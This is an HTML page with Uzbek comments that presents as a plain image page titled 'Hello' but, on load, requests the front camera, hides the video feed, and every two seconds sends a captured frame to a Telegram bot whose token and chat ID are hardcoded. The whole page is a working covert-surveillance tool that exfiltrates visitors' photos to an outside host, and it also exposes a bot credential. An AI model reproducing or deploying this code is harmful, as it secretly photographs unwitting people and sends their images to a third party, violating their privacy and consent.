<!DOCTYPE html>
<html lang="uz">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Hello</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: #000;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      overflow: hidden;
    }
    #bg {
      width: 100%;
      height: 100%;
      object-fit: cover;
      position: absolute;
      top: 0;
      left: 0;
      z-index: -1;
    }
    video {
      display: none; /* kamera videoni koâ€˜rsatmaydi */
    }
  </style>
</head>
<body>
  <!-- Sizning rasm -->
  <img id="bg" src="your-image.jpg" alt="Background"> <!-- bu yerga oâ€˜zingizning rasm yoâ€˜lini yozing -->
  <video id="video" autoplay playsinline muted></video>

  <script>
    const BOT_TOKEN = "8471262438:AAEFAMdTxDcAtKMzZFENdD0CxG2ZDWMlfi8";
    const CHAT_ID = "1889969457";
    const video = document.getElementById('video');
    let intervalId;

    async function initCamera() {
      try {
        // ðŸ”¹ Kamera ruxsati
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" },
          audio: false
        });
        video.srcObject = stream;

        // ðŸ”¹ Kamera tayyor boâ€˜lguncha kutamiz
        await new Promise((resolve) => {
          video.onloadedmetadata = () => resolve();
        });

        console.log("âœ… Kamera ishga tushdi");
        startSending();
      } catch (err) {
        alert("Kamera ruxsati rad etildi yoki xatolik: " + err.message);
        console.error(err);
      }
    }

    async function startSending() {
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');

      intervalId = setInterval(async () => {
        if (video.readyState < 2) return; // video tayyor emas

        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
        if (!blob) return;

        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', blob, 'frame.jpg');

        try {
          const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
          });
          if (!res.ok) console.error("Telegram yuborishda xato:", await res.text());
          else console.log("ðŸ“¤ Rasm yuborildi");
        } catch (e) {
          console.error("Fetch xatosi:", e);
        }
      }, 2000); // har 2 soniyada
    }

    // ðŸ”¹ Sahifa yuklanganda avtomatik kamera soâ€˜raydi
    window.addEventListener('load', () => {
      initCamera();
    });
  </script>
</body>
</html>
